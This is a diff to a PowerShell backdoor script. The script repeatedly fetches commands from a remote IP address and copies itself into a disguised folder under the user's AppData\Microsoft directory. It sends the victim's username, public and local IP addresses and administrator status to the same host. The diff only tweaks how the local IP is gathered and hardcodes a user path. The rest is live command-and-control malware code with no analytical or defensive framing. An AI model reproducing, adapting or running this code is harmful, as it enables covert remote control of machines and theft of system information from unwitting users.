@@ -2,7 +2,7 @@ $verurl = 'http://31.5.63.215/script.txt'
 $stop = 'destroy_shell_7$456&89'
 $exec = 0
 
-if(!(Test-Path -Path "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
+if(!(Test-Path -Path "C:\Users\XZE3N\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
 $modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
 		Write-Output "`$verurl` = 'http://31.5.63.215/script.txt'" > $modulename
 		Write-Output "`$stop` = 'destroy_shell'" >> $modulename
@@ -28,7 +28,7 @@ $modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
 		Write-Output "	`$time`=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');" >> $modulename
 		Write-Output "	`$ip` = (Invoke-WebRequest ifconfig.me/ip).Content" >> $modulename
 		Write-Output "	`$elevated` = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" >> $modulename
-		Write-Output "	`$localip` = (Get-NetIPConfiguration | Where-Object {`$_`.IPv4DefaultGateway -ne `$null` -and `$_`.NetAdapter.Status -ne `"Disconnected`"}).IPv4Address.IPAddress" >> $modulename
+		Write-Output "	`$localip` = `$`(ipconfig | Where-Object {`$_` -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; `$Matches`[1])" >> $modulename
 		Write-Output "	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType `"application/json`" -Method POST -Body `"`$ids` `$ip` `$env:USERNAME` `$elevated` `$localip` `$time` `" | Out-Null " >> $modulename
 		Write-Output "	if(`$exec` -eq `$filecontent`) {Start-Sleep -Seconds 10; Write-Output `"Command executed. Input another command or set script to standby.`"}" >> $modulename
 		Write-Output "	else {Write-Output `"Standing by.`"}" >> $modulename
@@ -83,7 +83,7 @@ while($true) {
 
 	$ip = (Invoke-WebRequest ifconfig.me/ip).Content
 	$elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-	$localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
+	$localip = $(ipconfig | Where-Object {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1])
 	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType "application/json" -Method POST -Body "$ids $ip $env:USERNAME $elevated $localip $time" | Out-Null
 
 	if($exec -eq $filecontent) {Start-Sleep -Seconds 10; Write-Output "Command executed. Input another command or set script to standby."}
